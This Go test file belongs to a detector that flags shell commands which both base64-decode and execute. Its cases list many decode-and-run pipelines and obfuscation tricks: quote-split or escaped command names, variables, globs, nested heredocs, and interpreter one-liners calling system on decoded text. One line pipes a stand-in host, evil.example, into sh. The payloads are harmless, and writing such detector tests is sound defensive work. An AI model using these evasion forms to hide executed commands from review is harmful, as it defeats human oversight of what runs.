package shelldecode

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// 修正轮 4 评审列出的「解码又执行」写法：不论两者怎样连接，都判为既解码又执行。
// 载荷都是无害的 aWQ=（id）或 ZWNobyBoaQ==（echo hi）。
func TestDecodeAndExecuteForms(t *testing.T) {
	cases := []string{
		"echo aWQ= | base64 -d | sh",
		"echo aWQ= | base64 --decode | bash",
		"echo aWQ= | base64 -D | zsh",
		"(echo aWQ= | base64 -d) | sh",
		"{ echo aWQ= | base64 -d; } | sh",
		"echo aWQ= | (base64 -d) | sh",
		`x=$(echo aWQ= | base64 -d); sh -c "$x"`,
		`x=$(echo aWQ= | base64 -d); eval "$x"`,
		`x=$(echo aWQ= | base64 -d); $x`,
		`env FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		`sudo FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		"timeout 5 sh -c 'echo aWQ= | base64 -d | sh'",
		"docker exec c sh -c 'echo aWQ= | base64 -d | sh'",
		"kubectl exec p -- sh -c 'echo aWQ= | base64 -d | sh'",
		"ssh host 'echo aWQ= | base64 -d | sh'",
		"su -c 'echo aWQ= | base64 -d | sh'",
		"if true; then bash -c 'echo aWQ= | base64 -d | sh'; fi",
		"sh <<'EOF'\necho aWQ= | base64 -d | sh\nEOF",
		"sh <<EOF\nx=$(echo aWQ= | base64 -d)\n$x\nEOF",
		"bash -s <<< 'echo aWQ= | base64 -d | sh'",
		"echo 'echo aWQ= | base64 -d | sh' | sh",
		"echo aWQ= | base64 -d 2>/dev/null > a.sh; sh a.sh",
		`echo aWQ= | base64 -d > a.sh; sh "$PWD/a.sh"`,
		"echo aWQ= | base64 -d > a.sh; cp a.sh b.sh; sh b.sh",
		`echo aWQ= | base64 -d > a.sh; find . -name a.sh -exec sh {} \;`,
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; PATH=.:$PATH a.sh",
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; ./a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; /tmp/a.sh",
		"echo aWQ= | openssl base64 -d | sh",
		"echo aWQ= | openssl enc -d -a | sh",
		"echo aWQ= | busybox base64 -d | sh",
		"echo NFSQ==== | base32 -d | sh",
		"echo dnE= | base64 -d | tr a-z n-za-m > a.sh; sh a.sh",
		`eval "$(echo YVdRPQ== | base64 -d | base64 -d)"`,
		"bash <(echo aWQ= | base64 -d)",
		"source <(echo aWQ= | base64 -d)",
		". <(echo aWQ= | base64 -d)",
		`python3 -c "$(echo aWQ= | base64 -d)"`,
		"echo aWQ= | base64 -d | xargs -I{} sh -c {}",
		"echo aWQ= | base64 -d | /bin/sh",
		"echo aWQ= | ba''se64 -d | s\\h",
		"ssh h \"bash -c \\\"echo aWQ= | base64 -d | sh\\\"\"",
		// 双引号里的 \\ 由外层 shell 去掉一层，里层 shell 再把 base\64 读成 base64；词里有变量时也一样
		`sh -c "$x echo aWQ= | base\\64 -d | sh"`,
		// $'…' 里的转义按 bash 解开：\x62 是 b
		`sh -c $'echo aWQ= | \x62ase64 -d | sh'`,
		`echo aWQ= | $'\x62ase64' -d | sh`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 命令名无法静态确定（变量、命令替换、花括号展开、通配、同一命令里定义的函数）时视同可能是
// 解码，命令里又执行代码就判为既解码又执行（决定 24）。在 bash -c、$(…) 里同样如此。
func TestDynamicCommandNameWithExecution(t *testing.T) {
	cases := []string{
		"b=base64; echo aWQ= | $b -d | sh",
		"echo aWQ= | ${b} -d | sh",
		`b="base64 -d"; echo aWQ= | $b | sh`,
		"echo aWQ= | $(echo base64) -d | sh",
		"echo aWQ= | `echo base64` -d | sh",
		"echo aWQ= | {ba,}se64 -d | sh",
		"echo aWQ= | bas?64 -d | sh",
		"echo aWQ= | base* -d | sh",
		"echo aWQ= | command ba[s]e64 -d | sh", // 在命令名位置时解析器把 ba[s]e64 当成数组赋值，解析不了
		"echo aWQ= | sudo $b -d | sh",
		"f(){ base64 -d; }; echo aWQ= | f | sh",
		"f(){ $1 -d; }; echo aWQ= | f base64 | sh",
		`f(){ base64 "$@"; }; echo aWQ= | f -d | sh`,
		`g(){ f -d; }; f(){ base64 "$@"; }; echo aWQ= | g | sh`,
		`function f { base64 "$@"; }; echo aWQ= | f -d | sh`,
		"bash -c 'b=base64; echo aWQ= | $b -d | sh'",
		"bash -c 'echo aWQ= | ${b} -d | sh'",
		"bash -c 'echo aWQ= | {ba,}se64 -d | sh'",
		"bash -c 'echo aWQ= | bas?64 -d | sh'",
		"bash -c 'f(){ base64 -d; }; echo aWQ= | f | sh'",
		"bash -c 'f(){ $1 -d; }; echo aWQ= | f base64 | sh'",
		`bash -c 'f(){ base64 "$@"; }; echo aWQ= | f -d | sh'`,
		`b=base64; bash -c "echo aWQ= | $b -d | sh"`,
		`sh -c "$(echo aWQ= | $b -d)"`,
		`sh -c "$(echo aWQ= | {ba,}se64 -d)"`,
		`eval "$(echo aWQ= | bas?64 -d)"`,
		`x=$(echo aWQ= | ${b} -d); sh -c "$x"`,
		`f(){ $1 -d; }; sh -c "$(echo aWQ= | f base64)"`,
		// 交给 shell 执行的脚本文本里，命令名的位置上的变量同样无法静态确定，不论带不带解码选项
		"bash -c 'echo aWQ= | $b | sh'",
		"ssh h 'echo aWQ= | ${b} | sh'",
		"docker exec c sh -c 'echo aWQ= | $b | sh'",
		"sh <<'E'\necho aWQ= | $b | sh\nE",
		"bash <<< 'echo aWQ= | $b | sh'",
		"echo 'echo aWQ= | $b | sh' | sh",
		// 同一命令里定义的别名和函数一样，命令名指向的是别名的内容
		"alias b=base64\necho aWQ= | b -d | sh",
		"alias b='base64 -d'; echo aWQ= | b | sh",
		"bash -c 'alias b=base64; echo aWQ= | b -d | sh'",
		// 解码出的文本落在命令名的位置上同样会被执行
		"$(echo aWQ= | base64 -d)",
		// eval、source 在当前 shell 里执行，其中定义的函数、别名在外层调用
		`eval 'f(){ base64 "$@"; }'; echo aWQ= | f -d | sh`,
		`source <(echo 'f(){ base64 "$@"; }'); echo aWQ= | f -d | sh`,
		"eval 'alias b=base64'; echo aWQ= | b -d | sh",
		"command alias b=base64; echo aWQ= | b -d | sh",
		// exec、xargs、busybox、chroot、find -exec 之后的词同样是命令名
		"echo aWQ= | exec $b -d | sh",
		"echo f | xargs -n 1 $b -d | sh",
		`find . -name f -exec $b -d {} \; | sh`,
		"echo aWQ= | busybox $b -d | sh",
		"echo aWQ= | chroot / $b -d | sh",
		// eval 与 ssh 把参数用空格连成一段脚本再执行
		"echo aWQ= | eval $b -d | sh",
		"echo aWQ= | ssh -p 22 h $b -d | sh",
		// 管道送进 shell 的输出来自子 shell、花括号块或中间的过滤命令
		"(echo 'echo aWQ= | $b | sh') | sh",
		"{ echo 'echo aWQ= | $b | sh'; } | sh",
		"echo 'echo aWQ= | $b | sh' | cat | sh",
		"cat <<'E' | tee /dev/null | sh\necho aWQ= | $b | sh\nE",
		// ssh 的远端命令是从标准输入读脚本的 shell
		"ssh h 'bash -s' <<'E'\necho aWQ= | $b | sh\nE",
		"cat <<'E' | ssh -p 22 h sudo sh\necho aWQ= | $b | sh\nE",
		"echo 'echo aWQ= | $b | sh' | ssh h",
		// trap 的参数在当前 shell 里执行
		"trap 'echo aWQ= | $b | sh' EXIT",
		"echo aWQ= | {a,{ba,}se64} -d | sh",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 命令名动态但不执行代码的命令照常送审；引号里的数据（awk 程序、jq 过滤、crontab 行）不当作
// 命令名动态的脚本。
func TestDynamicCommandNameWithoutExecution(t *testing.T) {
	cases := []string{
		"$EDITOR file",
		"$PAGER log.txt",
		"${KUBECTL:-kubectl} get pods",
		"awk '$3 > 100 {print $1}' data.txt",
		"kubectl get pods -o json | jq -r '.items[] | .metadata.name' | xargs -n1 echo",
		"echo '*/5 * * * * /usr/local/bin/backup' | crontab -",
		"[ -f a.sh ] && sh a.sh",
		// 交给 shell 的脚本里，awk 程序仍是数据
		`bash -c "awk '\$3 > 100 {print \$1}' data.txt"`,
		`ssh h "ps aux | awk '\$3 > 50 {print \$2}'"`,
		"alias ll='ls -l'; ll",
		`find . -name '*.log' -exec rm {} \;`,
		// 管道送进 shell 的是 awk、jq 的输出，不是它们的程序
		`kubectl get pods --no-headers | awk '$3=="Evicted" {print "kubectl delete pod " $1}' | sh`,
		`kubectl get pods -o json | jq -r '.items[] | "kubectl delete pod \(.metadata.name)"' | sh`,
		// ssh、sh -c 带着命令时，标准输入是给命令的数据，不是脚本
		`echo "$(hostname) $(uptime)" | ssh log@h 'cat >> /tmp/up'`,
		"ssh h 'cat > /tmp/run.sh' <<'EOF'\n$PY -m http.server\nEOF",
		"sh -c 'cat > /tmp/env' <<EOF\n$KEY=$VALUE\nEOF",
		// eval 整段脚本都在一个变量里时，没有可以单独看的命令名
		`eval "$(ssh-agent -s)"; ssh-add ~/.ssh/id_rsa`,
		`docker ps --format '{{.Names}},{{.Status}}' | xargs -n1 echo`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 修正轮 5 代码评审列出的误判（修正轮 6）：包装启动的选项与参数不是命令名，作为参数出现的名字
// 不是在运行该程序，同一命令里定义的函数按内容判断，路径命令名只有目录动态时按最后一段判断，
// find -exec 运行的是解码器时只算解码。这些命令照常送审。
func TestRevision6FalsePositivesAreReviewed(t *testing.T) {
	cases := []string{
		`log(){ echo "$@"; }; log start; ls; log done`,
		`env FOO=$BAR python3 app.py`,
		`timeout $T bash -c 'ls'`,
		`ssh host '$HOME/bin/tool --restart'`,
		`systemctl restart ssh && $EDITOR /etc/ssh/sshd_config`,
		`find . -name '*.b64' -exec base64 -d {} \;`,
		`sudo -u $U systemctl restart nginx`,
		`nice -n $N tar czf a.tgz dir`,
		`chroot $ROOT ls /etc`,
		`run(){ "$@"; }; run ls; run df -h`,
		`command -v sh >/dev/null && echo aGk= | base64 -d`,
		// xargs 不带程序时运行的是 echo
		"echo aWQ= | base64 -d | xargs",
		// 解释器代码里只有编码、没有解码
		`python3 -c 'import base64;print(base64.b64encode(b"x"))'`,
		`node -e "console.log(Buffer.from('hi').toString('base64'))"`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 包装启动按它实际运行的程序判断（修正轮 6）：运行 shell、解释器或无法静态确定的程序算执行代码，
// 运行解码器算解码；watch、parallel 把参数拼成脚本交给 shell。修正轮 5 代码评审列出的缺口都不送审。
func TestWrappersAreJudgedByTheProgramTheyRun(t *testing.T) {
	cases := []string{
		`exec "$SHELL" -l`,
		`watch -n1 'echo aWQ= | base64 -d | sh'`,
		`watch -n1 echo aWQ= '|' base64 -d '|' sh`,
		`echo aWQ= | watch -n 1 $b -d | sh`,
		`parallel ::: 'echo aWQ= | base64 -d | sh'`,
		`parallel ::: 'echo aWQ= > f' 'base64 -d f > a' 'sh a'`,
		`parallel echo aWQ= '|' base64 -d '|' sh ::: x`,
		`parallel -j 2 $b -d ::: f | sh`,
		`echo 'echo aWQ= | base64 -d | sh' | parallel`,
		`runuser -u x -- sh -c 'echo aWQ= | base64 -d | sh'`,
		`echo aWQ= | runuser -u x -- $b -d | sh`,
		`echo aWQ= | base64 -d | runuser -l x`,
		`systemd-run --wait sh -c 'echo aWQ= | base64 -d | sh'`,
		`echo aWQ= | systemd-run --wait -p User=x --unit u $b -d | sh`,
		`echo aWQ= | base64 -d | sudo -s`,
		`echo aWQ= | base64 -d | sudo -u $U bash`,
		`echo aWQ= | base64 -d | timeout $T nice -n $N sh`,
		`echo aWQ= | base64 -d > a; chroot $ROOT sh a`,
		`echo aWQ= | base64 -d | /usr/bin/env -u X sh`,
		`find . -name f -exec base64 -d {} \; -exec sh {} \;`,
		`echo aWQ= | busybox base64 -d | busybox sh`,
		`echo aWQ= | base64 -d | kubectl exec -i p -c c -- python3`,
		// 同一命令里定义的函数、别名按内容判断：内容是解码时就是解码
		`f(){ base64 -d; }; echo aWQ= | f | sh`,
		`alias d='base64 -d'; echo aWQ= | d | sh`,
		`alias s=sh; echo aWQ= | base64 -d | s`,
		`r(){ command bash "$@"; }; echo aWQ= | base64 -d | r`,
		// 子 shell 里定义的同名函数不影响外层运行的 sh
		`bash -c 'sh(){ :; }'; echo aWQ= | base64 -d | sh`,
		// 路径命令名只有目录动态时按最后一段的字面名判断
		`$DIR/base64 -d | sh`,
		`"$DIR"/base64 -d | sh`,
		`echo aWQ= | ${D}/bin/base64 -d | sh`,
		`echo aWQ= | base64 -d | $BIN/sh`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 交给脚本解释器的代码（-c / -e 参数、heredoc、管道送入）里出现 base64 解码也算解码（修正轮 6）；
// 解释器本身执行代码，所以这样的命令不送审。
func TestBase64DecodingInInterpreterCode(t *testing.T) {
	cases := []string{
		`python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`node -e "require('child_process').execSync(Buffer.from('aWQ=','base64').toString())"`,
		`node -e "require('child_process').execSync(Buffer.from(s.trim(), 'base64').toString())"`,
		`perl -MMIME::Base64 -e 'system(decode_base64("aWQ="))'`,
		`ruby -rbase64 -e 'system(Base64.decode64("aWQ="))'`,
		`ruby -e 'system("aWQ=".unpack1("m"))'`,
		`php -r 'system(base64_decode("aWQ="));'`,
		`deno eval 'import { decodeBase64 } from "jsr:@std/encoding"; base64.decode("aWQ=")'`,
		`pwsh -Command '[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aWQ="))'`,
		`pwsh -EncodedCommand aQBkAA==`,
		`node -e 'eval(atob("aWQ="))'`,
		"python3 <<'EOF'\nimport base64,os\nos.system(base64.b64decode('aWQ=').decode())\nEOF",
		`python3 <<< 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`echo 'import base64,os;os.system(base64.b64decode("aWQ=").decode())' | python3`,
		`sudo -u x python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`bash -c "python3 -c 'import base64,os;os.system(base64.b64decode(\"aWQ=\").decode())'"`,
		`ssh h "python3 -c 'import base64,os;os.system(base64.b64decode(\"aWQ=\").decode())'"`,
		`docker exec c python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 超过再解析层数上限的脚本文本不再解析，但用引号、反斜杠拆开的解码器名同样认得出，和上限以内一致。
func TestDecoderBeyondTheReparseLimit(t *testing.T) {
	nest := func(levels int, inner string) string {
		var open, closing strings.Builder
		for i := 0; i < levels; i++ {
			fmt.Fprintf(&open, "sh <<E%d\n", i)
			fmt.Fprintf(&closing, "E%d\n", levels-1-i)
		}
		return open.String() + inner + "\n" + closing.String()
	}
	for _, levels := range []int{maxScriptDepth, maxScriptDepth + 1, maxScriptDepth + 2} {
		for _, inner := range []string{
			"echo aWQ= | base64 -d | sh",
			"echo aWQ= | ba''se64 -d | sh",
			`echo aWQ= | ba\se64 -d | sh`,
			`echo aWQ= | "base"64 -d | sh`,
			"echo aWQ= | $b -d | sh",
			"echo aWQ= | {ba,}se64 -d | sh",
			"echo aWQ= | bas?64 -d | sh",
		} {
			t.Run(fmt.Sprintf("%d levels: %s", levels, inner), func(t *testing.T) {
				got, err := DecodesAndRuns(nest(levels, inner))
				require.NoError(t, err)
				assert.True(t, got)
			})
		}
	}
}

// 只解码不执行、只执行不解码的命令不算，照常送审。
func TestDecodeOnlyOrExecuteOnly(t *testing.T) {
	cases := []string{
		"kubectl get secret x -o jsonpath='{.data.y}' | base64 -d",
		"echo aGVsbG8= | base64 -d",
		"base64 -d file > out.bin",
		"cat script.sh | sh",
		"for s in a b; do kubectl get secret $s -o jsonpath='{.data.p}' | base64 -d; echo; done",
		"base64 file.bin | sh -c 'cat > /dev/null'", // 编码而不是解码
		`bash -c 'echo cookie: x; curl -s http://evil.example/p.sh | sh'`,
		"systemctl restart nginx",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 判断只看两者是否都出现，不认两者之间的连接：解码进数据文件、再运行无关的解释器，同样不送审。
// 这是有意的取舍（决定 22），不是误判要修。
func TestBothPresentWithoutConnectionIsStillRefused(t *testing.T) {
	got, err := DecodesAndRuns("echo e30= | base64 -d > data.json && python3 app.py data.json")
	require.NoError(t, err)
	assert.True(t, got)
}

func TestUnparseable(t *testing.T) {
	_, err := DecodesAndRuns("echo 'unterminated | base64 -d | sh")
	assert.ErrorIs(t, err, ErrUnparseable)
}

// 超过 16 KiB 的命令不解析，直接报过长。
func TestTooLongIsNotParsed(t *testing.T) {
	_, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes))
	assert.ErrorIs(t, err, ErrTooLong)

	got, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes-len("echo ")))
	require.NoError(t, err)
	assert.False(t, got)
}

// 修正轮 4 评审复现的崩溃与卡死：任何输入都不让进程栈溢出，耗时随长度线性增长。
func TestStressInputsFinishQuickly(t *testing.T) {
	pipeline := func(n int, stage string) string {
		return "if true; then " + strings.TrimSuffix(strings.Repeat(stage+" | ", n), " | ") + "; fi"
	}
	largestPipeline := func(stage, tail string) string {
		n := (MaxCommandBytes - len("if true; then ; fi") - len(tail)) / len(stage+" | ")
		return pipeline(n, stage) + tail
	}
	nested := func(n int, opening, closing string) string {
		return strings.Repeat(opening, n) + "a" + strings.Repeat(closing, n)
	}
	deepest := func(opening, closing string) string {
		return nested((MaxCommandBytes-1)/len(opening+closing), opening, closing)
	}
	cases := map[string]struct {
		cmd     string
		wantErr error
		want    bool
	}{
		"200k $( levels": {cmd: nested(200000, "$(", ")"), wantErr: ErrTooLong},
		"200k ( levels":  {cmd: nested(200000, "(", ")"), wantErr: ErrTooLong},
		"40k-stage if":   {cmd: pipeline(40000, "a"), wantErr: ErrTooLong},
		// $($(a)) 执行命令替换的输出：一层层的命令名都无法静态确定
		"5000 $( levels":                           {cmd: nested(5000, "$(", ")"), want: true},
		"deepest $( under the cap":                 {cmd: deepest("$(", ")"), want: true},
		"deepest ( under the cap":                  {cmd: deepest("(", ")")},
		"deepest \"$( under the cap":               {cmd: deepest(`"$(`, `)"`), want: true},
		"deepest bash -c \"$( under the cap":       {cmd: deepest(`bash -c "$(`, `)"`)},
		"largest if pipeline under the cap":        {cmd: largestPipeline("a", "")},
		"decode near the cap":                      {cmd: largestPipeline("base64 -d", "; sh a.sh"), want: true},
		"dynamic names near the cap":               {cmd: largestPipeline("$b -d", "; sh a.sh"), want: true},
		"brace names near the cap":                 {cmd: largestPipeline("{ba,}se64 -d", "; sh a.sh"), want: true},
		"glob names near the cap":                  {cmd: largestPipeline("bas?64 -d", "; sh a.sh"), want: true},
		"many dynamic names near the cap":          {cmd: largestPipeline("$EDITOR file", ""), want: true},
		"deepest bash -c \"$( with a dynamic name": {cmd: deepest(`bash -c "$($b -d `, `)"`), want: true},
		// 命令名里层层嵌套、没有展开的花括号
		"deepest unclosed { command name":   {cmd: strings.Repeat("{", MaxCommandBytes-1) + "a"},
		"deepest {…} command name":          {cmd: deepest("{", "}")},
		"deepest { command name in sh -c":   {cmd: "sh -c '" + strings.Repeat("{", MaxCommandBytes-len("sh -c 'a b'")) + "a b'"},
		"many -exec after wrappers":         {cmd: "find ." + strings.Repeat(" -exec sudo", (MaxCommandBytes-len("find ."))/len(" -exec sudo"))},
		"eval of many words near the cap":   {cmd: "eval" + strings.Repeat(" $b -d", (MaxCommandBytes-len("eval"))/len(" $b -d")), want: true},
		"pipes into sh nested near the cap": {cmd: deepest("(echo 'a b' | ", " | sh)")},
		"functions near the cap": {
			cmd:  strings.Repeat("f(){ $1 -d; }; f base64; ", (MaxCommandBytes-len("sh"))/len("f(){ $1 -d; }; f base64; ")) + "sh",
			want: true,
		},
		"nested quoted dynamic scripts near the cap": {
			cmd:  strings.Repeat(`sh -c 'echo aWQ= | $b -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | $b -d'; `)),
			want: true,
		},
		"nested quoted scripts near the cap": {
			cmd:  strings.Repeat(`sh -c 'echo aWQ= | base64 -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | base64 -d'; `)),
			want: true,
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			if c.wantErr == nil {
				require.LessOrEqual(t, len(c.cmd), MaxCommandBytes)
			}
			start := time.Now()
			got, err := DecodesAndRuns(c.cmd)
			elapsed := time.Since(start)
			t.Logf("%d bytes in %s", len(c.cmd), elapsed)
			assert.Less(t, elapsed, 2*time.Second)
			if c.wantErr != nil {
				assert.ErrorIs(t, err, c.wantErr)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, c.want, got)
		})
	}
}
